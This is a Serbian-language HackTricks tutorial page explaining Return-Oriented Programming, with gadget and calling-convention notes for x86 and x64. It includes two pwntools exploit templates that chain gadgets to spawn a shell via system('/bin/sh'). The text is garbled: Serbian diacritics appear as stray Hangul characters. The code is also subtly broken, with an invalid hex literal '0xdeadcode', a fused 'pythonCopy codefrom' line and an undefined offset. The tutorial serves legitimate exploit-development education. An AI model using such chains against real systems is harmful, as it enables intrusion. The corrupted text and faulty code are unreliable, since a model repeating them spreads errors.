# ROP - Return Oriented Programing

<details>

<summary><strong>Nau캜ite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi na캜ini podr코ke HackTricks-u:

* Ako 쬰lite da vidite svoju **kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRIJAVU**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvani캜ni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**Porodicu PEASS**](https://opensea.io/collection/the-peass-family), na코u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridru쬴te se** 游눫 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 游냕 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

## **Osnovne informacije**

**Return-Oriented Programming (ROP)** je napredna tehnika eksploatacije koja se koristi za zaobila쬰nje sigurnosnih mera poput **No-Execute (NX)** ili **Data Execution Prevention (DEP)**. Umesto ubacivanja i izvr코avanja shell koda, napada캜 koristi delove koda ve캖 prisutne u binarnom fajlu ili u u캜itanim bibliotekama, poznate kao **"gadgeti"**. Svaki gadget obi캜no zavr코ava sa `ret` instrukcijom i obavlja malu operaciju, poput preme코tanja podataka izme캠u registara ili obavljanja aritmeti캜kih operacija. Spajanjem ovih gadgeta, napada캜 mo쬰 konstruisati payload za obavljanje proizvoljnih operacija, efikasno zaobilaze캖i NX/DEP za코tite.

### Kako ROP funkcioni코e

1. **Preuzimanje kontrole toka**: Prvo, napada캜 mora preuzeti kontrolu toka programa, obi캜no iskori코캖avanjem prelivanja bafera da bi prepisao sa캜uvanu adresu povratka na steku.
2. **Spajanje Gadgeta**: Napada캜 zatim pa쬷jivo bira i spaja gadgete da bi obavio 쬰ljene akcije. To mo쬰 uklju캜ivati postavljanje argumenata za poziv funkcije, pozivanje funkcije (npr. `system("/bin/sh")`), i rukovanje svim neophodnim 캜i코캖enjem ili dodatnim operacijama.
3. **Izvr코avanje Payloada**: Kada ranjiva funkcija zavr코i, umesto povratka na legitimnu lokaciju, po캜inje izvr코avanje lanca gadgeta.

## ROP Lanac u x86 Primeru

### **x86 (32-bit) Konvencije pozivanja**

* **cdecl**: Pozivaoc 캜isti stek. Argumenti funkcije se guraju na stek u obrnutom redosledu (desno-levi). **Argumenti se guraju na stek s desna na levo.**
* **stdcall**: Sli캜no cdecl-u, ali callee je odgovoran za 캜i코캖enje steka.

### **Pronala쬰nje Gadgeta**

Prvo, pretpostavimo da smo identifikovali potrebne gadgete unutar binarnog fajla ili njegovih u캜itanih biblioteka. Gadgeti koji nas zanimaju su:

* `pop eax; ret`: Ovaj gadget skida vrh vrednosti sa steka u registar `EAX` i zatim se vra캖a, omogu캖avaju캖i nam kontrolu nad `EAX`.
* `pop ebx; ret`: Sli캜no kao prethodno, ali za registar `EBX`, omogu캖avaju캖i kontrolu nad `EBX`.
* `mov [ebx], eax; ret`: Preme코ta vrednost iz `EAX` u memorijsku lokaciju na koju pokazuje `EBX` i zatim se vra캖a.
* Dodatno, imamo adresu funkcije `system()` dostupnu.

### **ROP Lanac**

Koriste캖i **pwntools**, pripremamo stek za izvr코avanje ROP lanca kako bismo izvr코ili `system('/bin/sh')`, obratite pa쬹ju kako lanac po캜inje sa:

1. `ret` instrukcijom radi poravnanja (opciono)
2. Adresom funkcije `system` (pretpostavljaju캖i da je ASLR isklju캜en i poznata libc, vi코e informacija u [**Ret2lib**](ret2lib/))
3. Rezervisanom adresom za povratnu adresu iz `system()`
4. Adresom stringa `"/bin/sh"` (parametar za funkciju system)
```python
from pwn import *

# Assuming we have the binary's ELF and its process
binary = context.binary = ELF('your_binary_here')
p = process(binary.path)

# Find the address of the string "/bin/sh" in the binary
bin_sh_addr = next(binary.search(b'/bin/sh\x00'))

# Address of system() function (hypothetical value)
system_addr = 0xdeadcode

# A gadget to control the return address, typically found through analysis
ret_gadget = 0xcafebabe  # This could be any gadget that allows us to control the return address

# Construct the ROP chain
rop_chain = [
ret_gadget,    # This gadget is used to align the stack if necessary, especially to bypass stack alignment issues
system_addr,   # Address of system(). Execution will continue here after the ret gadget
0x41414141,    # Placeholder for system()'s return address. This could be the address of exit() or another safe place.
bin_sh_addr    # Address of "/bin/sh" string goes here, as the argument to system()
]

# Flatten the rop_chain for use
rop_chain = b''.join(p32(addr) for addr in rop_chain)

# Send ROP chain
## offset is the number of bytes required to reach the return address on the stack
payload = fit({offset: rop_chain})
p.sendline(payload)
p.interactive()
```
## Primer ROP lanac u x64

### **x64 (64-bit) Konvencije pozivanja**

* Koristi **System V AMD64 ABI** konvenciju pozivanja na sistemima sli캜nim Unix-u, gde se **prva 코est celobrojnih ili pokaziva캜kih argumenata prosle캠uje u registre `RDI`, `RSI`, `RDX`, `RCX`, `R8`, i `R9`**. Dodatni argumenti se prosle캠uju na steku. Povratna vrednost se sme코ta u `RAX`.
* **Windows x64** konvencija pozivanja koristi `RCX`, `RDX`, `R8`, i `R9` za prva 캜etiri celobrojna ili pokaziva캜ka argumenta, sa dodatnim argumentima prosle캠enim na steku. Povratna vrednost se sme코ta u `RAX`.
* **Registri**: 64-bitni registri uklju캜uju `RAX`, `RBX`, `RCX`, `RDX`, `RSI`, `RDI`, `RBP`, `RSP`, i `R8` do `R15`.

#### **Pronala쬰nje Gadgeta**

Za na코u svrhu, fokusira캖emo se na ged쬰te koji 캖e nam omogu캖iti postavljanje registra **RDI** (kako bismo prosledili string **"/bin/sh"** kao argument funkciji **system()**) i zatim pozvali funkciju **system()**. Pretpostavi캖emo da smo identifikovali slede캖e ged쬰te:

* **pop rdi; ret**: Skida vrh vrednosti sa steka u registar **RDI** i zatim se vra캖a. Neophodno za postavljanje argumenta za **system()**.
* **ret**: Jednostavan povratak, koristan za poravnanje steka u nekim scenarijima.

I znamo adresu funkcije **system()**.

### **ROP Lanac**

U nastavku je primer kori코캖enja **pwntools** za postavljanje i izvr코avanje ROP lanca sa ciljem izvr코avanja **system('/bin/sh')** na **x64**:
```python
pythonCopy codefrom pwn import *

# Assuming we have the binary's ELF and its process
binary = context.binary = ELF('your_binary_here')
p = process(binary.path)

# Find the address of the string "/bin/sh" in the binary
bin_sh_addr = next(binary.search(b'/bin/sh\x00'))

# Address of system() function (hypothetical value)
system_addr = 0xdeadbeefdeadbeef

# Gadgets (hypothetical values)
pop_rdi_gadget = 0xcafebabecafebabe  # pop rdi; ret
ret_gadget = 0xdeadbeefdeadbead     # ret gadget for alignment, if necessary

# Construct the ROP chain
rop_chain = [
ret_gadget,        # Alignment gadget, if needed
pop_rdi_gadget,    # pop rdi; ret
bin_sh_addr,       # Address of "/bin/sh" string goes here, as the argument to system()
system_addr        # Address of system(). Execution will continue here.
]

# Flatten the rop_chain for use
rop_chain = b''.join(p64(addr) for addr in rop_chain)

# Send ROP chain
## offset is the number of bytes required to reach the return address on the stack
payload = fit({offset: rop_chain})
p.sendline(payload)
p.interactive()
```
U ovom primeru:

* Koristimo **`pop rdi; ret`** ged쬰t da postavimo **`RDI`** na adresu **`"/bin/sh"`**.
* Direktno ska캜emo na **`system()`** nakon postavljanja **`RDI`**, sa adresom **`system()`** funkcije u lancu.
* **`ret_gadget`** se koristi za poravnanje ako ciljano okru쬰nje zahteva, 코to je 캜e코캖e u **x64** da bi se osiguralo pravilno poravnanje steka pre pozivanja funkcija.

### Poravnanje Steka

**x86-64 ABI** osigurava da je **stek poravnan na 16 bajtova** kada se izvr코i **call instrukcija**. **LIBC**, radi optimizacije performansi, **koristi SSE instrukcije** (kao 코to su **movaps**) koje zahtevaju ovo poravnanje. Ako stek nije pravilno poravnan (코to zna캜i da **RSP** nije vi코ekratnik broja 16), pozivi funkcija poput **system** 캖e neuspe코no zavr코iti u **ROP lancu**. Da biste to re코ili, jednostavno dodajte **ret ged쬰t** pre pozivanja **system** u va코em ROP lancu.

## x86 vs x64 glavna razlika

{% hint style="success" %}
Po코to x64 koristi registre za prvih nekoliko argumenata, 캜esto zahteva manje ged쬰ta od x86 za jednostavne pozive funkcija, ali pronala쬰nje i povezivanje odgovaraju캖ih ged쬰ta mo쬰 biti slo쬰nije zbog pove캖anog broja registara i ve캖eg adresnog prostora. Pove캖ani broj registara i ve캖i adresni prostor u **x64** arhitekturi pru쬬ju i mogu캖nosti i izazove za razvoj eksploatacija, posebno u kontekstu Return-Oriented Programming (ROP).
{% endhint %}

## Za코tite

* [**ASLR**](../common-binary-protections-and-bypasses/aslr/)
* [**Stack Canaries**](../common-binary-protections-and-bypasses/stack-canaries/)

## Ostali Primeri i Reference

* [https://ir0nstone.gitbook.io/notes/types/stack/return-oriented-programming/exploiting-calling-conventions](https://ir0nstone.gitbook.io/notes/types/stack/return-oriented-programming/exploiting-calling-conventions)

## Tehnike zasnovane na ROP-u

Primetite da je ROP samo tehnika za izvr코avanje proizvoljnog koda. Na osnovu ROP-a razvijeno je mnogo Ret2XXX tehnika:

* **Ret2lib**: Koristi ROP za pozivanje proizvoljnih funkcija iz u캜itane biblioteke sa proizvoljnim parametrima (obi캜no ne코to poput `system('/bin/sh')`.

{% content-ref url="ret2lib/" %}
[ret2lib](ret2lib/)
{% endcontent-ref %}

* **Ret2Syscall**: Koristi ROP za pripremu poziva syscall-a, npr. `execve`, i izvr코avanje proizvoljnih komandi.

{% content-ref url="rop-syscall-execv.md" %}
[rop-syscall-execv.md](rop-syscall-execv.md)
{% endcontent-ref %}

* **EBP2Ret & EBP Chaining**: Prvi 캖e zloupotrebiti EBP umesto EIP-a za kontrolu toka, a drugi je sli캜an Ret2lib-u, ali u ovom slu캜aju tok je kontrolisan uglavnom sa EBP adresama (mada je tako캠e potrebno kontrolisati i EIP).

{% content-ref url="ebp2ret-ebp-chaining.md" %}
[ebp2ret-ebp-chaining.md](ebp2ret-ebp-chaining.md)
{% endcontent-ref %}

<details>

<summary><strong>Nau캜ite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi na캜ini podr코ke HackTricks-u:

* Ako 쬰lite da vidite svoju **kompaniju reklamiranu na HackTricks-u** ili da **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRIJAVU**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvani캜ni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), na코u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridru쬴te se** 游눫 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 游냕 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
